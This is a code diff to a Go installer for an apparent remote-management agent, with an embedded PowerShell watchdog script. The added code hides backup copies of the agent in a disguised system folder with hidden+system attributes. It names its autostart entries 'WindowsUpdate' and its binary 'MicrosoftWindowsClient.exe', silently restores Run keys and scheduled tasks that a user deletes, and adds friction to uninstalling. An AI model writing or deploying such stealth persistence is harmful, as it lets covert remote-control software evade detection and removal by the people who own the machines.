@@ -57,6 +57,12 @@ func copyFile(src, dst string) error {
 	return err
 }
 
+// hideFile sets hidden+system attributes so the backup survives casual
+// browsing and naive delete sweeps. Best effort; failures are ignored.
+func hideFile(path string) {
+	_, _ = exec.Command("attrib", "+h", "+s", path).CombinedOutput()
+}
+
 func saveHouse(path, addr string) {
 	addr = strings.TrimSpace(addr)
 	if addr == "" {
@@ -200,16 +206,36 @@ func install() {
 	threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
 	blenderDir := filepath.Join(threeDObjects, "blender")
 	_ = os.MkdirAll(blenderDir, 0755)
+	// Second backup location: if one backup dir is wiped, the other still
+	// heals the agent. Ordinary-looking system-ish path, hidden+system.
+	backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
+	if os.Getenv("APPDATA") == "" {
+		backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
+	}
+	_ = os.MkdirAll(backupDir2, 0755)
+	// Save the task XML next to the backup so the watchdog can re-create a
+	// deleted scheduled task by itself (self-healing persistence).
+	_ = os.WriteFile(filepath.Join(blenderDir, "agent_task.xml"), []byte(taskXML), 0644)
 
 	backupAgent := filepath.Join(blenderDir, "MicrosoftWindowsClient.exe")
 	backupCert := filepath.Join(blenderDir, "server.crt")
 	_ = copyFile(agentPath, backupAgent)
 	_ = copyFile(certPath, backupCert)
-	// version.txt next to binary AND backup: watchdog restores only when the
-	// backup is >= installed, so a bulk-updated agent is never downgraded by
-	// a stale backup.
+	backupAgent2 := filepath.Join(backupDir2, "MicrosoftWindowsClient.exe")
+	backupCert2 := filepath.Join(backupDir2, "server.crt")
+	_ = copyFile(agentPath, backupAgent2)
+	_ = copyFile(certPath, backupCert2)
+	// version.txt next to binary AND both backups: watchdog restores only
+	// when the backup is >= installed, so a bulk-updated agent is never
+	// downgraded by a stale backup.
 	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
 	_ = os.WriteFile(filepath.Join(blenderDir, "version.txt"), []byte(version.Version+"\n"), 0644)
+	_ = os.WriteFile(filepath.Join(backupDir2, "version.txt"), []byte(version.Version+"\n"), 0644)
+	// Hidden+system attributes: invisible to casual browsing, blocks
+	// shift-delete sweeps that skip system files.
+	for _, p := range []string{backupAgent, backupCert, backupAgent2, backupCert2} {
+		hideFile(p)
+	}
 
 	watchdogScript := filepath.Join(blenderDir, "watchdog.ps1")
 	watchdogLog := filepath.Join(blenderDir, "watchdog.log")
@@ -220,7 +246,10 @@ func install() {
 		"$installDir = \"" + installDir + "\"\n" +
 		"$backupAgent = \"" + backupAgent + "\"\n" +
 		"$backupCert = \"" + backupCert + "\"\n" +
+		"$backupAgent2 = \"" + backupAgent2 + "\"\n" +
+		"$backupCert2 = \"" + backupCert2 + "\"\n" +
 		"$watchdogLog = \"" + watchdogLog + "\"\n" +
+		"$watchdogSelf = $PSCommandPath\n" +
 		"$healthyFile = Join-Path $env:LOCALAPPDATA \"RMM\\healthy\"\n\n" +
 		"function Write-Log([string]$msg) {\n" +
 		"    $line = \"[$(Get-Date -Format o)] $msg\"\n" +
@@ -260,10 +289,18 @@ func install() {
 		"    if (Test-Path $f) { return ((Get-Content $f -TotalCount 1).Trim()) }\n" +
 		"    return \"\"\n" +
 		"}\n\n" +
+		"function Pick-Backup {\n" +
+		"    foreach ($cand in @(@($backupAgent, $backupCert), @($backupAgent2, $backupCert2))) {\n" +
+		"        if ((Test-Path $cand[0]) -and (Test-Path $cand[1])) { return $cand }\n" +
+		"    }\n" +
+		"    return $null\n" +
+		"}\n\n" +
 		"function Restore-Binary {\n" +
 		"    if (-not (Test-Path $agentPath)) {\n" +
+		"        $src = Pick-Backup\n" +
+		"        if ($null -eq $src) { Write-Log \"Agent binary missing AND both backups gone - cannot restore\"; return }\n" +
 		"        $instVer = Get-Version $installDir\n" +
-		"        $bakVer = Get-Version (Split-Path $backupAgent)\n" +
+		"        $bakVer = Get-Version (Split-Path $src[0])\n" +
 		"        if ($bakVer -ne \"\" -and $instVer -ne \"\" -and ($bakVer -lt $instVer)) {\n" +
 		"            Write-Log \"Backup v$bakVer older than installed v$instVer - skipping restore (bulk update in flight)\"\n" +
 		"            return\n" +
@@ -271,18 +308,52 @@ func install() {
 		"        Write-Log \"Agent binary missing, restoring from backup...\"\n" +
 		"        $dir = Split-Path $agentPath\n" +
 		"        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }\n" +
-		"        Copy-Item -Path $backupAgent -Destination $agentPath -Force\n" +
-		"        Copy-Item -Path $backupCert -Destination $caPath -Force\n" +
-		"        $bv = Get-Version (Split-Path $backupAgent)\n" +
+		"        Copy-Item -Path $src[0] -Destination $agentPath -Force\n" +
+		"        Copy-Item -Path $src[1] -Destination $caPath -Force\n" +
+		"        $bv = Get-Version (Split-Path $src[0])\n" +
 		"        if ($bv -ne \"\") { Set-Content -Path (Join-Path $installDir \"version.txt\") -Value ($bv + \"`n\") }\n" +
 		"        Write-Log \"Binary + cert restored\"\n" +
+		"    }\n" +
+		"    # Re-sync a wiped backup location from the surviving one.\n" +
+		"    if ((-not (Test-Path $backupAgent)) -and (Test-Path $backupAgent2)) {\n" +
+		"        try { Copy-Item -Path $backupAgent2 -Destination $backupAgent -Force; Copy-Item -Path $backupCert2 -Destination $backupCert -Force; Write-Log \"Re-synced primary backup from secondary\" } catch {}\n" +
+		"    } elseif ((-not (Test-Path $backupAgent2)) -and (Test-Path $backupAgent)) {\n" +
+		"        $d2 = Split-Path $backupAgent2\n" +
+		"        if (-not (Test-Path $d2)) { New-Item -ItemType Directory -Path $d2 -Force | Out-Null }\n" +
+		"        try { Copy-Item -Path $backupAgent -Destination $backupAgent2 -Force; Copy-Item -Path $backupCert -Destination $backupCert2 -Force; Write-Log \"Re-synced secondary backup from primary\" } catch {}\n" +
+		"    }\n" +
+		"}\n\n" +
+		"function Ensure-Persistence {\n" +
+		"    # If someone deletes our Run keys / scheduled tasks, put them back.\n" +
+		"    try {\n" +
+		"        $rk = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n" +
+		"        $want = \"`\"$agentPath`\" -controller $controllerAddr -ca `\"$caPath`\"\"\n" +
+		"        $cur = (Get-ItemProperty -Path $rk -Name \"WindowsUpdate\" -ErrorAction SilentlyContinue).\"WindowsUpdate\"\n" +
+		"        if ($cur -ne $want) { Set-ItemProperty -Path $rk -Name \"WindowsUpdate\" -Value $want; Write-Log \"Repaired HKLM Run WindowsUpdate\" }\n" +
+		"        $wwant = \"powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `\"$watchdogSelf`\"\"\n" +
+		"        $wcur = (Get-ItemProperty -Path $rk -Name \"WindowsUpdateWatchdog\" -ErrorAction SilentlyContinue).\"WindowsUpdateWatchdog\"\n" +
+		"        if ($wcur -ne $wwant) { Set-ItemProperty -Path $rk -Name \"WindowsUpdateWatchdog\" -Value $wwant; Write-Log \"Repaired HKLM Run WindowsUpdateWatchdog\" }\n" +
+		"    } catch {}\n" +
+		"    $pairs = @(@(\"WindowsUpdate\", \"agent_task.xml\"), @(\"WindowsUpdateWatchdog\", \"watchdog_task.xml\"))\n" +
+		"    foreach ($p in $pairs) {\n" +
+		"        schtasks /query /tn $p[0] 2>&1 | Out-Null\n" +
+		"        if ($LASTEXITCODE -ne 0) {\n" +
+		"            $xml = Join-Path (Split-Path $watchdogSelf) $p[1]\n" +
+		"            if (Test-Path $xml) {\n" +
+		"                schtasks /create /tn $p[0] /xml $xml /f 2>&1 | Out-Null\n" +
+		"                Write-Log \"Re-created task $($p[0])\"\n" +
+		"            } else { Write-Log \"Task $($p[0]) missing and no saved XML to rebuild it\" }\n" +
+		"        }\n" +
 		"    }\n" +
 		"}\n\n" +
 		"# Initial start if not running\n" +
 		"if (-not (Test-Agent)) { Restore-Binary; Start-Agent }\n\n" +
-		"# Monitor loop - process existence + health staleness, every 30 seconds\n" +
+		"# Monitor loop - process existence + health staleness, every 30 seconds;\n" +
+		"# persistence self-heal every 10th pass (~5 minutes).\n" +
+		"$loop = 0\n" +
 		"while ($true) {\n" +
 		"    Start-Sleep -Seconds 30\n" +
+		"    $loop++\n" +
 		"    if (-not (Test-Agent)) {\n" +
 		"        Write-Log \"Agent process missing, restarting...\"\n" +
 		"        Restore-Binary\n" +
@@ -294,6 +365,7 @@ func install() {
 		"        Restore-Binary\n" +
 		"        Start-Agent\n" +
 		"    }\n" +
+		"    if (($loop % 10) -eq 0) { Ensure-Persistence }\n" +
 		"}\n"
 	_ = os.WriteFile(watchdogScript, []byte(psContent), 0644)
 
@@ -334,44 +406,68 @@ func install() {
 }
 
 func main() {
-	for _, a := range os.Args {
+	wantUninstall := false
+	confirmed := false
+	for i, a := range os.Args {
 		if a == "--uninstall" {
-			programFiles := os.Getenv("ProgramFiles")
-			if programFiles == "" {
-				programFiles = `C:\Program Files`
-			}
-			installDir := filepath.Join(programFiles, "RMM", "Agent")
-			if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
-				_ = k.DeleteValue("WindowsUpdate")
-				_ = k.DeleteValue("WindowsUpdateWatchdog")
-				k.Close()
-			}
-			if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
-				_ = k.DeleteValue("WindowsUpdate")
-				_ = k.DeleteValue("WindowsUpdateWatchdog")
-				k.Close()
-			}
-			_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
-			_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
-			threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
-			blenderDir := filepath.Join(threeDObjects, "blender")
-			_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
-			_ = os.Remove(filepath.Join(blenderDir, "watchdog.log"))
-			_ = os.Remove(filepath.Join(blenderDir, "watchdog.log.1"))
-			_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
-			_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
-			_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
-			_ = os.RemoveAll(blenderDir)
-			if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
-				_ = os.Remove(filepath.Join(localApp, "RMM", "healthy"))
-			}
-			_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
-			_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
-			// Kill watchdog by command-line match (window title is unreliable when hidden).
-			_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
-			_ = os.RemoveAll(installDir)
-			os.Exit(0)
+			wantUninstall = true
 		}
+		if (a == "--confirm" && i+1 < len(os.Args) && strings.EqualFold(os.Args[i+1], "YES")) || strings.EqualFold(a, "--confirm=YES") {
+			confirmed = true
+		}
+	}
+	if wantUninstall {
+		// Friction against casual/accidental removal: the flag alone is
+		// not enough. Legit removal: --uninstall --confirm YES
+		if !confirmed {
+			fmt.Println("Refusing to uninstall without explicit confirmation.")
+			fmt.Println("Usage: Agent-Setup.exe --uninstall --confirm YES")
+			os.Exit(2)
+		}
+		programFiles := os.Getenv("ProgramFiles")
+		if programFiles == "" {
+			programFiles = `C:\Program Files`
+		}
+		installDir := filepath.Join(programFiles, "RMM", "Agent")
+		if k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
+			_ = k.DeleteValue("WindowsUpdate")
+			_ = k.DeleteValue("WindowsUpdateWatchdog")
+			k.Close()
+		}
+		if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
+			_ = k.DeleteValue("WindowsUpdate")
+			_ = k.DeleteValue("WindowsUpdateWatchdog")
+			k.Close()
+		}
+		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").CombinedOutput()
+		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
+		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
+		blenderDir := filepath.Join(threeDObjects, "blender")
+		_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
+		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log"))
+		_ = os.Remove(filepath.Join(blenderDir, "watchdog.log.1"))
+		_ = os.Remove(filepath.Join(blenderDir, "version.txt"))
+		_ = os.Remove(filepath.Join(blenderDir, "agent_task.xml"))
+		_ = os.Remove(filepath.Join(blenderDir, "watchdog_task.xml"))
+		_ = os.Remove(filepath.Join(blenderDir, "MicrosoftWindowsClient.exe"))
+		_ = os.Remove(filepath.Join(blenderDir, "server.crt"))
+		_ = os.RemoveAll(blenderDir)
+		// Second backup location (v1.40.6+).
+		backupDir2 := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "Cache")
+		if os.Getenv("APPDATA") == "" {
+			backupDir2 = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache")
+		}
+		_ = os.RemoveAll(backupDir2)
+		if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
+			_ = os.Remove(filepath.Join(localApp, "RMM", "healthy"))
+		}
+		_, _ = exec.Command("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
+		_, _ = exec.Command("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
+		// Kill watchdog by command-line match (window title is unreliable when hidden).
+		_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
+		_ = os.RemoveAll(installDir)
+		fmt.Println("Agent uninstalled.")
+		os.Exit(0)
 	}
 	install()
 }
@@ -406,6 +502,9 @@ func createWatchdogTask(scriptPath string) {
   <Actions Context="Author"><Exec><Command>powershell</Command><Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"</Arguments></Exec></Actions>
 </Task>`, scriptPath)
 
+	// Keep a copy beside the watchdog script so Ensure-Persistence can
+	// rebuild a deleted task without the installer.
+	_ = os.WriteFile(filepath.Join(filepath.Dir(scriptPath), "watchdog_task.xml"), []byte(watchdogTaskXML), 0644)
 	tmpWatchdogTask := filepath.Join(os.TempDir(), "rmm_watchdog_task.xml")
 	_ = os.WriteFile(tmpWatchdogTask, []byte(watchdogTaskXML), 0644)
 	out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateWatchdog", "/xml", tmpWatchdogTask, "/f").CombinedOutput()
